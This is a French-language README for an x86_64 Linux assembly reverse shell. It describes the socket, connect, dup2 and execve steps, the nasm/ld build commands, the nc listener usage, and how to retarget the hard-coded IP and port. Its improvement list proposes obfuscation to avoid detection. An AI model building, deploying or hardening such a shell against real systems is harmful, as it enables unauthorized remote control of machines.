# Reverse Shell en Assembly x86_64

Ce projet est un reverse shell minimaliste écrit en assembly pour les systèmes Linux 64 bits. Il établit une connexion TCP sortante vers une adresse IP et un port spécifiés, redirige les entrées/sorties vers cette connexion, et exécute un shell (`/bin/sh`).

## Fonctionnalités
- Crée un socket TCP/IPv4.
- Se connecte à une adresse IP et un port configurables (par défaut : `127.0.0.1:4444`).
- Redirige stdin, stdout et stderr vers le socket.
- Exécute `/bin/sh` pour fournir un shell distant.
- Gestion basique des erreurs pour chaque appel système.

## Prérequis
- Un système Linux 64 bits.
- `nasm` (Netwide Assembler) pour assembler le code.
- `ld` (linker) pour générer l'exécutable.
- `netcat` (`nc`) pour tester la connexion (optionnel).

## Compilation
1. Sauvegarde le code dans un fichier nommé `reverse_shell.asm`.
2. Assemble et linke le code avec les commandes suivantes :
   ```bash
   nasm -f elf64 rev_shell.asm -o rev_shell.o
   ld rev_shell.o -o rev_shell
   ```
3. L'exécutable `rev_shell` est prêt à être utilisé.

## Utilisation
1. Lance un listener sur la machine cible (par défaut : `127.0.0.1:4444`) :
   ```bash
   nc -l 4444
   ```
2. Exécute le reverse shell :
   ```bash
   ./rev_shell
   ```
3. Une fois connecté, tu peux envoyer des commandes via le listener.

### Configuration de l'IP et du port
- Par défaut, le code se connecte à `127.0.0.1` (localhost) sur le port `4444`.
- Pour modifier l'IP ou le port :
  - Édite la section de la structure `sockaddr_in` dans le code :
    - `mov word [rsi + 2], 0x5c11` : remplace `0x5c11` par ton port en big-endian (ex. `0x115c` pour 4444).
    - `mov dword [rsi + 4], 0x0100007f` : remplace `0x0100007f` par ton IP en big-endian (ex. `0xc0a80101` pour `192.168.1.1`).
  - Recompile ensuite le programme.

## Structure du code
- **Socket** : Crée un socket TCP avec `SYS_socket`.
- **Connect** : Établit la connexion avec `SYS_connect`.
- **Dup2** : Redirige stdin/stdout/stderr avec une boucle `dup2`.
- **Execve** : Lance `/bin/sh` avec `SYS_execve`.
- **Exit** : Termine proprement en cas d'erreur avec `SYS_exit`.

## Limitations
- L'IP et le port sont codés en dur dans cette version. Une injection externe ou un chargeur pourrait les rendre dynamiques.
- Testé uniquement sur Linux x86_64.

## Exemple
Sur la machine cible :
```bash
nc -l 4444
```
Sur la machine source :
```bash
./rev_shell
```
Tape des commandes comme `whoami` ou `ls` dans le listener pour voir les résultats.

## Contribution
Les suggestions d'amélioration sont bienvenues ! Quelques idées :
- Ajouter une configuration dynamique de l'IP/port via un buffer externe.
- Réduire encore la taille du binaire.
- Ajouter une obfuscation pour éviter la détection.

## Avertissement
Ce code est destiné à des fins éducatives ou de recherche uniquement. Ne l'utilise pas pour des activités malveillantes ou illégales.
